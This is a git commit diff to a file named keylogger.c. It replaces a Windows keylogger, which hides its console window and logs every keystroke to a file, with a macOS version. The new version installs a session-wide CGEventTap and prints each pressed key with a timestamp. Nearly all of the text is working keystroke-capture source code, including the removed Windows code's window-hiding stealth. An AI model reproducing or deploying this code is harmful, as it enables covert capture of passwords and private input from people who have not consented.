6cd51f8f40db9a5d2e994a131f4c774beedf6a6a
William <wceriale@cs.washington.edu>
2016-06-15 18:41:05 -0700

    added number to string conversions

--- keylogger/keylogger.c
+++ keylogger/keylogger.c
@@ -1,66 +1,148 @@
-/*
-    Simple WINDOWS keylogger by jkrix 2013.
-    User may distribute and modify source code but MUST keep this top commented section in the source code!
+// OSX LOGGER
 
-    Very important note:
-
-    To be used for educational use and not for malicious tasks!
-    I will NOT be held responsible for anything silly you may do with this!
-*/
 #include <stdio.h>
-#include <conio.h>
-#include <windows.h>
 #include <time.h>
+#include <ApplicationServices/ApplicationServices.h>
 
-#define PATH "C:/Users/Administrator/Desktop/test-log.txt" // The path to the log file
-
-int main(){
-    char capture;
-    FILE *file;
-
-    // Time stuff.
-    time_t t;
-    t = time(NULL);
-    // Hide the window
-    HWND window;
-    AllocConsole();
-    window=FindWindowA("ConsoleWindowClass",NULL);
-    ShowWindow(window,0);
-
-    file = fopen(PATH, "a+");
-    fprintf(file, "\n#$Logger: Written by jkrix. Started logging @ %s", ctime(&time));
-
-    while(1)
-    {
-        Sleep(20); // To make sure this program doesn't steal all resources.
-        if (kbhit())
-        {
-            capture = getch();
-            // Just add in some helper strings here to the file, feel free to modify these to your needs.
-            switch ((int)capture){
-                case ' ': // Space key...obviously.
-                    fprintf(file, " ");
-                    break;
-                case 0x09: // Tab key.
-                    fprintf(file, "[TAB]");
-                    break;
-                case 0x0D: // Enter key.
-                    fprintf(file, "[ENTER]");
-                    break;
-                case 0x1B: // Escape key.
-                    fprintf(file, "[ESC]");
-                    break;
-                case 0x08: // Backspace key.
-                    fprintf(file, "[BACKSPACE]");
-                    break;
-                default:
-                    fputc(capture,file); // Put any other inputted key into the file.
-            }
-
-            if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
-                fclose(file);
-                return 0;
-            }
-        }
+char *get_char(int key) {
+    switch ((int) key) {
+        case 0:   return "a";
+        case 1:   return "s";
+        case 2:   return "d";
+        case 3:   return "f";
+        case 4:   return "h";
+        case 5:   return "g";
+        case 6:   return "z";
+        case 7:   return "x";
+        case 8:   return "c";
+        case 9:   return "v";
+        case 11:  return "b";
+        case 12:  return "q";
+        case 13:  return "w";
+        case 14:  return "e";
+        case 15:  return "r";
+        case 16:  return "y";
+        case 17:  return "t";
+        case 18:  return "1";
+        case 19:  return "2";
+        case 20:  return "3";
+        case 21:  return "4";
+        case 22:  return "6";
+        case 23:  return "5";
+        case 24:  return "=";
+        case 25:  return "9";
+        case 26:  return "7";
+        case 27:  return "-";
+        case 28:  return "8";
+        case 29:  return "0";
+        case 30:  return "]";
+        case 31:  return "o";
+        case 32:  return "u";
+        case 33:  return "[";
+        case 34:  return "i";
+        case 35:  return "p";
+        case 37:  return "l";
+        case 38:  return "j";
+        case 39:  return "'";
+        case 40:  return "k";
+        case 41:  return ";";
+        case 42:  return "\\";
+        case 43:  return ",";
+        case 44:  return "/";
+        case 45:  return "n";
+        case 46:  return "m";
+        case 47:  return ".";
+        case 50:  return "`";
+        case 65:  return "[decimal]";
+        case 67:  return "[asterisk]";
+        case 69:  return "[plus]";
+        case 71:  return "[clear]";
+        case 75:  return "[divide]";
+        case 76:  return "[enter]";
+        case 78:  return "[hyphen]";
+        case 81:  return "[equals]";
+        case 82:  return "0";
+        case 83:  return "1";
+        case 84:  return "2";
+        case 85:  return "3";
+        case 86:  return "4";
+        case 87:  return "5";
+        case 88:  return "6";
+        case 89:  return "7";
+        case 91:  return "8";
+        case 92:  return "9";
+        case 36:  return "[return]";
+        case 48:  return "[tab]";
+        case 49:  return " ";
+        case 51:  return "[del]";
+        case 53:  return "[esc]";
+        case 54:  return "[right-cmd]";
+        case 55:  return "[left-cmd]";
+        case 56:  return "[left-shift]";
+        case 57:  return "[caps]";
+        case 58:  return "[left-option]";
+        case 59:  return "[left-ctrl]";
+        case 60:  return "[right-shift]";
+        case 61:  return "[right-option]";
+        case 62:  return "[right-ctrl]";
+        case 63:  return "[fn]";
+        case 64:  return "[f17]";
+        case 72:  return "[volup]";
+        case 73:  return "[voldown]";
+        case 74:  return "[mute]";
+        case 79:  return "[f18]";
+        case 80:  return "[f19]";
+        case 90:  return "[f20]";
+        case 96:  return "[f5]";
+        case 97:  return "[f6]";
+        case 98:  return "[f7]";
+        case 99:  return "[f3]";
+        case 100: return "[f8]";
+        case 101: return "[f9]";
+        case 103: return "[f11]";
+        case 105: return "[f13]";
+        case 106: return "[f16]";
+        case 107: return "[f14]";
+        case 109: return "[f10]";
+        case 111: return "[f12]";
+        case 113: return "[f15]";
+        case 114: return "[help]";
+        case 115: return "[home]";
+        case 116: return "[pgup]";
+        case 117: return "[fwddel]";
+        case 118: return "[f4]";
+        case 119: return "[end]";
+        case 120: return "[f2]";
+        case 121: return "[pgdown]";
+        case 122: return "[f1]";
+        case 123: return "[left]";
+        case 124: return "[right]";
+        case 125: return "[down]";
+        case 126: return "[up]";
     }
+    return "[unknown]";
+}
+
+
+CGEventRef on_tap(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
+  CGKeyCode key = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+  time_t now; time(&now);
+  char * c = get_char(key);
+  printf("%d %s\n", (int)now, c); fflush(stdout);
+  return event;
+}
+
+int main(int argc, const char * argv[]) {
+  CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
+  CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
+  CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, mask, on_tap, &flags);
+  if (!tap) {
+    fprintf(stderr, "This program requires sudo.");
+    return -1;
+  }
+  CFRunLoopSourceRef runloop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
+  CFRunLoopAddSource(CFRunLoopGetCurrent(), runloop, kCFRunLoopCommonModes);
+  CGEventTapEnable(tap, true);
+  CFRunLoopRun();
+  return 0;
 }
